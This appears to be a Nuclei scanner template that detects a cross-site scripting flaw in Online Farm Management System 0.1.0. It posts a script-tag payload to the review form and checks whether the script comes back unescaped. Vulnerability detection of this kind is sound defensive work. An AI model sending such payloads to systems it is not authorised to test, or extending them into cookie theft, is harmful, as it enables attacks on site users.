http:
- host-redirects: true
  matchers:
  - part: body
    type: word
    words:
    - '<em style="color: black;"><script>alert(document.domain)</script>'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  raw:
  - 'POST /reviewInput.php?pid=1 HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    comment=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&rating=0

    '
id: onlinefarm-management-xss
info:
  author: arafatansari
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  description: 'Online Farm Management System 0.1.0 contains a cross-site scripting
    vulnerability via the review.php file.

    '
  metadata:
    max-request: 1
    verified: true
  name: Online Farm Management System 0.1.0 - Cross-Site Scripting
  reference:
  - https://www.exploit-db.com/exploits/48673
  severity: high
  tags: onlinefarm,cms,xss,edb
